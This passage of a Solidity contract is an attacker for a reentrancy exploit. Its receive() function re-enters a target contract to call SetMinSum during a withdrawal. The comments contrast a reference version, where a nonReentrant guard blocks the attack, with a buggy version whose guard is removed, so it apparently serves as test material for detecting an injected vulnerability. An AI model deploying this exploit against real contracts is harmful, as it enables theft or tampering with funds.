    bool private reentered;
    uint256 private attackAmt;

    constructor(address _target) {
        target = C(_target);
    }

    function attack(uint256 amt, uint256 lockTime) external payable {
        attackAmt = amt;
        // First, Put some funds to have a balance and set unlockTime
        target.Put{value: msg.value}(lockTime);
        // Now call Collect which will send Ether back to this contract
        target.Collect(amt);
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            // Reentrantly try to change MinSum via SetMinSum
            // In reference, nonReentrant_ guard prevents reentry (require(!locked_) fails)
            // In buggy version, guard is removed so SetMinSum succeeds
            target.SetMinSum(999999);
        }
    }
